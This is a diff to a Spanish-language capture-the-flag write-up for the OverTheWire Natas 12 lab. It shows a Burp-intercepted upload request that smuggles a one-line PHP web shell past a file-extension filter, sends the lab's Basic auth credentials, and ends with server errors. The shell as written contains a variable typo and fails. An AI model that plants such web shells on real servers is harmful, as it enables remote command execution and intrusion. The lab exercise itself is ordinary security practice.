@@ -122,7 +122,7 @@ Programamos una **Shell** en **PHP** muy sencilla que nos permitirá lanzar coma
 ?>
 ```
 
-Lo guardamos como **cmdShell.php.jpg** con un tamaño de **35bytes** y lo intentamos subir. 
+Lo guardamos como **phpShell.php.jpg** con un tamaño de **35bytes** y lo intentamos subir. 
 
 Con esto estaríamos pasando el filtro del **Tamaño* y el filtro de la **Extensión**
 
@@ -150,6 +150,49 @@ Tenemos que conseguir **interceptar** el contenido que se envia y cambiarle la e
 
 Para ello vamos a utilizar la herramienta **BURP** que podemos encontrar en la distro de Linux para **Pentesting** - **Kali Linux**
 
+Configuramos el **proxy** del navegador apuntando al **localhost:8080** donde estará **BURP** escuchando para que luego podamos modificar los datos a nuestro antojo.
+
+Subimos el fichero **phpShell.php.jpg** y luego lo cambiaremos luego con el **BURP**
+
+Obtenemos lo siguiente:
+
+```html
+POST /index.php HTTP/1.1
+Host: natas12.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas12.natas.labs.overthewire.org/
+Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------17458871318756377591816066944
+Content-Length: 515
+
+-----------------------------17458871318756377591816066944
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------17458871318756377591816066944
+Content-Disposition: form-data; name="filename"
+
+phpShell.php.jpg
+-----------------------------17458871318756377591816066944
+Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
+Content-Type: application/x-php
+
+<?
+passthru($GET_['cmd']);
+?>
+-----------------------------17458871318756377591816066944--
+```
+
+
+The file upload/ujofljdn2f.php has been uploaded
+
+Notice: Undefined variable: GET_ in /var/www/natas/natas12/upload/ujofljdn2f.php on line 2
+
+Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/ujofljdn2f.php on line 2
 
 
 
